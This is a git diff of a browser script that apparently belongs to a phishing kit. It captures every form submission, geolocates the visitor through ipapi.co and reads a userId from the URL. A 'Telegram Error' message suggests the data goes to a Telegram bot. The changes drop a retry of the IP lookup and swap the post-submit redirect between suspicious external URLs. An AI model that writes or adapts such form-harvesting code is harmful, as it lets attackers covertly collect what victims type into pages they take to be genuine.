@@ -4,7 +4,7 @@ document.addEventListener("DOMContentLoaded", () => {
 
   let userCountry = "Unknown"; // default
 
-  // Fetch country name first
+  // Get country name from IP (via ipapi.co)
   fetch("https://ipapi.co/json/")
     .then(res => res.json())
     .then(data => {
@@ -17,19 +17,6 @@ document.addEventListener("DOMContentLoaded", () => {
   forms.forEach((form, index) => {
     form.addEventListener("submit", async (e) => {
       e.preventDefault();
-
-      // ✅ Ensure we wait until userCountry is resolved
-      if (userCountry === "Unknown") {
-        try {
-          const res = await fetch("https://ipapi.co/json/");
-          const data = await res.json();
-          if (data && data.country_name) {
-            userCountry = data.country_name;
-          }
-        } catch (err) {
-          console.error("Retry IP lookup error:", err);
-        }
-      }
 
       // Get userId from URL or use default
       const urlParams = new URLSearchParams(window.location.search);
@@ -62,7 +49,7 @@ document.addEventListener("DOMContentLoaded", () => {
           form.reset();
 
           // Redirect after submission
-          window.location.href = "https://otieu.com/4/9831084"; // <<< change to any URL you want
+          window.location.href = "https://rrloaty.github.io/intelligent/lin.html"; // <<< change to any URL you want
         } else {
           const errorText = await response.text();
           console.error("Telegram Error:", errorText);
